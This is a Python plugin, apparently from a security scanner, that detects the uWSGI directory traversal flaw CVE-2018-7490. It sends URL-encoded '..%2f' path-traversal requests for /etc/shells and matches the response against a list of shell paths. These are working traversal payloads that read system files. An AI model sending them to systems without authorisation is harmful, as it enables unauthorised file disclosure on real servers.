from lib.poc.dummy import *
import re


patten = re.compile(r'(#\s/etc/shells:)', re.M)
patten_ex = re.compile(
    r'(/bin/sh|/bin/dash|/bin/bash|/bin/rbash|/usr/bin/tmux|/usr/bin/screen|/usr/bin/sh|'
    r'/bin/zsh|/usr/bin/zsh|/usr/local/bin/sh|/usr/local/bin/bash|/bin/tcsh|/usr/bin/tcsh|'
    r'/bin/csh|/bin/rbash|/sbin/nologin|/usr/local/bin/zsh|/usr/local/bin/nologin|/sbin/sh|'
    r'/usr/local/bin/zsh|/usr/local/bin/tcsh|/usr/local/bin/rbash|/bin/false)', re.M)


async def test_path(ip, port, url, path):
    r = await http_client(ip, port).get(url + path, timeout=20)
    if r.status_code == 200 and (patten.search(r.text) or patten_ex.search(r.text)):
        return True


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    paths = [
        '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shells',
        '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shellS',
        '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shells'
    ]
    try:

        url = '{}://{}:{}'.format(service, ip, port)
        if await test_path(ip, port, url, paths[0]) and \
                not await test_path(ip, port, url, paths[1]) and \
                await test_path(ip, port, url, paths[2]):
            ret = {
                'alert_group': 'uWSGI < 2.0.17 - Directory Traversal',
                'affects': '{}://{}:{}'.format(service, ip, port),
                'details': '{}\n{} , {}\n'
                           'Path Traversal Vulnerability in uWSGI < 2.0.17 '
                           '(CVE-2018-7490)'.format(url, paths[0], paths[2])
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'ajp13', True, task_msg={})
    run_plugin_test(scan)
